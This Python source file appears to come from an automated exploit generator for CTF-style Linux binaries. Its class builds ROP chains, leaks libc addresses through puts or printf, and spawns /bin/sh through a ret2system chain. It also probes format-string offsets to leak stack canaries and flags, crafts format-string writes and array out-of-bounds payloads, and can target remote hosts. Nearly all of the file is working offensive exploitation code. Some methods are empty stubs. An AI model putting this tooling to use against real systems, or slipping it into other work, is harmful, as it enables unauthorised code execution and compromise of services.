import logging
import r2pipe
import binaryninja as bn
import re

from pwn import *
from binascii import *
from rage.machine import Machine
from rage.log import aegis_log

class Against:
    """Class for generating and interfacing with the binary."""
    
    def __init__(self, binary_path, libc, machine: Machine, ip, port, flag_format):
        """Create the against class."""

        context.update(
            arch = "amd64",
            endian = "little",
            log_level = "CRITICAL",
            os = "linux",
            terminal = "st"
        )

        self.binary = binary_path
        self.binary_name = binary_path.split("/")[-1]
        self.elf = ELF(self.binary)
        self.libc = libc
            
        self.machine = machine
        self.ip = ip
        self.port = port
        self.debug = False
        self.option = ""

        self.delimiter = b">>>"

        self.flag = None
        self.remote_flag = None
        self.flag_format = flag_format
        self.flag_regex = re.compile(re.escape(flag_format) + b"{([^}]*)}")


        self.libc_offset_string = b""
        self.canary_offset_string = b""
        self.format_write_string = b""

        self.has_libc_leak = False
        self.libc_resolved = False
        self.leak_function = None

        self.process = None
        
        self.format_exploit = None
        self.array_exploit = None
        self.chain = None
        self.padding = None
        self.libc_exploit = None
        self.exploit = None

    def start(self, option):
        """Return the running process to a binary."""
        gs = """
            set context-sections regs disasm
            b vuln
            b execve@plt
            b system@plt
            b win
            finish
        """
        self.option = option

        if option == "REMOTE" and self.ip != None and self.port != None:
            return remote(self.ip, self.port)
        elif option == "REMOTE" and self.ip != None and self.port == None:
            return remote(self.ip, 443, ssl=True, sni=self.ip)
        elif option == "GDB":
            self.debug = True
            return gdb.debug(self.binary, gdbscript=gs)
        else:
            return process(self.binary)

    def rop_chain_write_string(self, string, writeable_address):
        """Return a rop chain to write a string into the binary."""
        chain = b""

        write_gadgets = self.machine.find_write_gadget()

        if write_gadgets == None:
            return chain 

        write_gadget, reg1, reg2 = write_gadgets
        aegis_log.debug(f"[{self.binary_name}] Using write gadget {write_gadget} with {reg1}, {reg2} to {hex(writeable_address)}")
        write_gadget_address = int(write_gadget.split(b":")[0],16)

        reg_params = self.machine.reg_args 
        reg_size_1 = self.machine.bv.arch.regs[reg1.decode("utf-8")].size        
        reg_size_2 = self.machine.bv.arch.regs[reg2.decode("utf-8")].size

        # Find smallest register size
        reg_size = 8 
        if reg_size_1 < reg_size_2:
            reg_size = reg_size_1
        elif reg_size_2 < reg_size_1:
            reg_size = reg_size_2
        else:
            reg_size = reg_size_1

        index = 0
        while len(string) - index > 0:
            rem = (len(string) - index) % (reg_size+1)
            reg_gadget = self.machine.find_reg_gadget(reg1.decode("utf-8"))
            if reg_gadget != None:
                for reg_gadget_str in reg_gadget:
                    rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
                    chain += rg_gadget + p64(writeable_address+index)
                    instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                    for inst in instructions:
                        if b"pop" in inst:
                            chain += b"A"*8

            reg_gadget = self.machine.find_reg_gadget(reg2.decode("utf-8"))
            if reg_gadget != None:
                for reg_gadget_str in reg_gadget:
                    rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))

                    write_str = string[index:index+rem+1]
                    write_str = write_str + b"\x00" * (8 - len(write_str))
                    chain += rg_gadget + write_str
                    instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                    for inst in instructions:
                        if b"pop" in inst:
                            reg = inst.strip(b" ").split(b" ")[1]
                            if reg.decode("utf-8") == reg1:
                                index = reg_params.index(reg.decode("utf-8"))
                                chain += p64(writeable_address+index) 
                            else:
                                chain += b"B"* 8 
            chain += p64(write_gadget_address)
            instructions = write_gadget.split(b":")[1].split(b";")[1:]
            for inst in instructions:
                if b"pop" in inst:
                    chain += b"C" * 8
 
            index += reg_size
        return chain

    def rop_chain_syscall(self, parameters):
        """Return a rop chain to call a function with the specific parameters."""
        chain = b""

        reg_params = self.machine.sys_reg_args
        
        if len(parameters) > 0:
            for i in range(len(parameters)):
                reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
                if reg_gadgets != None:
                    for reg_gadget_str in reg_gadgets:
                        reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
                        chain += reg_gadget + p64(parameters[i])
                        instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                        for inst in instructions:
                            if b"pop" in inst:
                                reg = inst.strip(b" ").split(b" ")[1]
                                if reg.decode("utf-8") in reg_params:
                                    index = reg_params.index(reg.decode("utf-8"))
                                    chain += p64(parameters[index])
                                else:
                                    chain += p64(0)

                            elif b"add rsp" in inst:
                                value = int(inst.split(b",")[1].strip(), 16)
                                chain += p64(0) * (value / 8)
        
            rop = ROP(self.elf)
            chain += p64(rop.find_gadget(["syscall", "ret"])[0])

        return chain
        
    def rop_chain_call_function(self, function, parameters):
        """Return a rop chain to call a function with the specific parameters."""
        chain = b""

        reg_params = self.machine.reg_args[:len(parameters)]

        if len(parameters) > 0:
            for i in range(len(parameters)):
                reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
                if reg_gadgets != None:
                    for reg_gadget_str in reg_gadgets:
                        reg_addr = int(reg_gadget_str.split(b":")[0],16)
                        reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
                        chain += reg_gadget + p64(parameters[i])
                        instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                        for inst in instructions:
                            if b"pop" in inst:
                                reg = inst.strip(b" ").split(b" ")[1]
                                if reg.decode("utf-8") in reg_params:
                                    index = reg_params.index(reg.decode("utf-8"))
                                    chain += p64(parameters[index])
                                else:
                                    chain += b"A" * 8

                            elif b"add rsp" in inst:
                                value = int(inst.split(b",")[1].strip(), 16)
                                chain += p64(0) * (value / 8)
        
        chain += p64(self.elf.sym[function])

        return chain

    def rop_ret2puts(self):
        """Return a rop chain that prints out a got address for a function."""
        chain = b""

        self.leak_function = self.machine.find_functions(["puts", "printf"])[0]
        leak_gadget = int(self.machine.find_reg_gadget("rdi")[0].split(b":")[0].strip(), 16)

        got_function = self.elf.got[self.leak_function]
        plt_function = self.elf.plt[self.leak_function]
        if "vuln" in self.elf.sym.keys():
            main = self.elf.sym["vuln"]
        else:
            main = self.elf.sym["main"]

        chain += p64(leak_gadget) + p64(got_function) 
        if self.leak_function == "printf":
            chain += p64(self.elf.sym["_fini"])
            chain += p64(plt_function)
            chain += p64(self.elf.sym["_fini"])
            chain += p64(main)
        else:
            chain += p64(plt_function)
            chain += p64(main)

        aegis_log.debug(f"[{self.binary_name}] Setting up libc leak with {self.leak_function}")
        self.has_libc_leak = True

        return chain 

    def recv_libc_leak(self, p, symb):
        """ Function that will take in any libc byte leak """
        pattern = re.compile(b'.{5}\x7f')
        match = None
        attempts = 0
        while match == None and attempts <= 20:  
            try:
                output = p.recvline(timeout=2)
            except EOFError:
                aegis_log.error(f"[{self.binary_name}] Could not find libc leak")
                break
            match = pattern.search(output)
            attempts += 1

        if match:
            leak = match.group(0)
            leak = u64(leak.ljust(8, b'\x00'))
            aegis_log.info(f"[{self.binary_name}] Found libc leak {hex(leak)}")
            libc_base = leak - self.libc.sym[symb]
            aegis_log.info(f"[{self.binary_name}] Calculated libc base {hex(libc_base)}")

            self.libc_resolved = True
            return libc_base
        else:
            aegis_log.warning(f"[{self.binary_name}] Failed to get libc leak")
            return None

    def rop_chain_libc(self, libc_base):
        """Return a ROP chain for ret2system in libc."""
        chain = b""

        r = ROP(self.libc)
        system = self.libc.sym["system"] + libc_base
        pop_rdi = r.find_gadget(["pop rdi", "ret"])[0] + libc_base
        ret = pop_rdi + 1
        binsh = next(self.libc.search(b"/bin/sh\x00")) + libc_base

        log.info(f"[{self.binary_name}] Pop Rdi {hex(pop_rdi)}\nSystem {hex(system)}\nBinsh {hex(binsh)}")

        chain += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

        return chain

    def rop_chain_srop_exec(self):
        """Return a SROP chain to execute system("/bin/sh")."""
        chain = b""
        return chain

    def rop_chain_srop_read(self):
        """Return a SROP chain to read in "/bin/sh"."""
        chain = b""
        return chain

    def rop_chain_dlresolve(self):
        """Return a chain that dlresolves system."""
        chain = b""
        dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

        return chain

    def rop_chain_open(self, file):
        """Return a rop chain that opens a specific file."""
        chain = b""
        return chain

    def rop_chain_read(self, writable_memory, fd, size):
        """Return a rop chain that reads in the writable memory."""
        chain = b""
        return chain

    def rop_chain_write(self, writable_memory, fd, size):
        """Return a rop chain that writes from writable memory into fd."""
        chain = b""
        return chain

    def format_leak(self,option):
        """Return the offset string for the format leak."""
        start_end = [0,0]
        stack_len = 200
        string = ""

        aegis_log.debug(f"Performing a printf format leak: {option}")
        for i in range(1, stack_len):

            p = self.start(option)
            offset_str = "%" + str(i) + "$p."
            p.sendline(bytes(offset_str, "utf-8"))

            try:
                p.recvuntil(b":", timeout=2)
                response = p.recvline().strip().split(b".")
                if response[0].decode() != "(nil)":
                    address = response[0].decode()

                    response = response[0].split(b"x")[1]

                    canary = re.search(r"0x[a-f0-9]{14}00", address)

                    if canary and self.machine.canary:
                        self.canary_offset_string = offset_str
                        aegis_log.info(f"[{self.binary_name}] Found canary leak at offset {i}: {address}")

                    libc_leak = re.search(r"0x7f[a-f0-9]+34a", address)

                    if libc_leak:
                        self.libc_offset_string = offset_str.split(".")[0]
                        aegis_log.info(f"[{self.binary_name}] Found libc leak at offset {i} with {address}")
                    

                    if len(response) % 2 == 1:
                        response = b"0" + response

                    hex = [response[i:i+2] for i in range(0, 16, 2)][::-1]

                    try: 
                        new_string = ""
                        for val in hex:
                            if val != b"":

                                flag_char = int(val,16)
                                new_string += chr(flag_char)
                        #print(new_string)
                        # start end [ 0 , 0]
                        # first var is if the first part of the flag was found

                        if self.flag_format.decode("utf-8") in new_string and start_end[0] == 0:
                            string += new_string
                            start_end[0] = 1
                        elif start_end[0] == 1 and "}" in new_string:
                            string += new_string
                            end_index = string.index("}")
                            string = string[:end_index+1]

                            if option == "REMOTE":
                                self.remote_flag = string
                            else:
                                self.flag = string
                            break
                        elif start_end[0] == 1 and "}" not in new_string:
                            string += new_string
                        elif "}" in new_string and start_end[1] == 0 and start_end[0] == 1:
                            string += new_string
                            end_index = string.index("}")
                            string = string[:end_index+1]

                            if option == "REMOTE":
                                self.remote_flag = string
                            else:
                                self.flag = string
                            break
                    except Exception as e:

                        print(e)
                        p.close()
                    p.close()
            except Exception as e:
                p.close()
            p.close()


    def format_write(self, value, addr):
        """Return a format write string payload."""
        payload_writes = {
            addr: value
        }

        aegis_log.debug(f"[{self.binary_name}] Setting up format string write to {hex(addr)} with value {hex(value)}")
        offset = 0
        
        # Find first offset
        for i in range(1,100):
            p = process(self.binary)
            probe = "AAAAAAAZ%" + str(i) + "$p"
            p.sendline(bytes(probe,"utf-8"))


            data = p.recvall(timeout=2).decode().strip("\n").split("Z")
            if "0x5a41414141414141" in data[1]:
                offset = i
                p.close()
                break
            p.close()

        aegis_log.debug(f"[{self.binary_name}] Found stack offset {offset}")
        self.format_exploit = fmtstr_payload(offset, payload_writes, write_size='byte')

    def check_exploit(self):
        """Checks exploit for bad bytes."""
        if b"\x0a" in self.exploit:
            self.exploit = self.exploit.replace(b"\x0a", b"\x0b")
            aegis_log.error(f"[{self.binary_name}] Found bad byte \\n in exploit")
        if self.array_exploit != None and b"\x0a" in self.array_exploit[1]:
            self.array_exploit[1] = self.array_exploit[1].replace(b"\x0a", b"\x0b")
            aegis_log.error(f"[{self.binary_name}] Found bad byte \\n in exploit")


    def send_exploit(self):
        self.exploit = self.padding + self.chain
        self.check_exploit()

        if len(self.exploit) > 0 and self.format_exploit == None:
            aegis_log.debug(f"Sending chain as {self.chain}") 
            self.process.sendline(self.exploit)
            if self.has_libc_leak == True:
                libc_base = self.recv_libc_leak(self.process, self.leak_function)
                if libc_base != None:
                    self.libc_exploit = self.padding + self.rop_chain_libc(libc_base)

                    aegis_log.debug(f"Sending libc system chain {self.libc_exploit}")
                    self.process.sendline(self.libc_exploit)

            if self.debug == True:
                self.process.interactive()
        else:
            if self.format_exploit != None and self.array_exploit == None or len(self.array_exploit) == 0: 
                aegis_log.debug(f"Sending format string exploit as {self.format_exploit} {len(self.format_exploit)} {len(self.format_exploit) % 16}")
                self.process.sendline(self.format_exploit)
            elif len(self.array_exploit) == 2:
                aegis_log.debug(f"Sending array out of bounds {self.array_exploit[0], self.array_exploit[1]}")

                self.process.sendline(b"%i" % self.array_exploit[0])
                self.process.recvuntil(self.delimiter)
                self.process.sendline(self.array_exploit[1])

            #if self.has_libc_leak == True:
                #libc_base = self.recv_libc_leak(self.process, self.leak_function)
                #chain = self.rop_chain_libc(libc_base)
                #aegis_log.info(f"Sending libc system chain {self.chain}")
                #self.process.sendline(chain)
            if self.debug == True:
                self.process.interactive()


    def verify_flag(self):
        """Return whether the exploit worked or didn't."""
        if self.recieve_flag() == 1 or self.flag != None:
            aegis_log.critical(f"Exploit works got flag {self.flag}")
            return True
        else:
            aegis_log.error(f"Exploit failed")
            return False

    def recieve_flag(self):
        """Return the flag after parsing it from the binary."""
        try:
            # Just for safe measures ofc

            
            if self.process.poll() == None:
                self.process.sendline(b"cat flag.txt")
                self.process.sendline(b"cat flag.txt")
                self.process.sendline(b"cat flag.txt")
                self.process.sendline(b"exit")

            output = self.process.recvall(timeout=2)
            # Don't want to print big output from format write
            if self.format_exploit == None:
                aegis_log.debug(f"Recieved output {output}")
            match = self.flag_regex.search(output)

            if match:
                flag = self.flag_format.decode("utf-8") + "{" + match.group(1).decode('utf-8') + "}" 
                aegis_log.critical(f"Captured the flag !!! {flag}")
                if self.option != "REMOTE":
                    self.flag = flag
                else:
                    self.remote_flag = flag

                return 1
            elif b"command not found" in output:
                aegis_log.error(f"Error from shell command")
                return 1
        except EOFError as e:
            aegis_log.error(f"Error recieving flag {e}")
            return -1
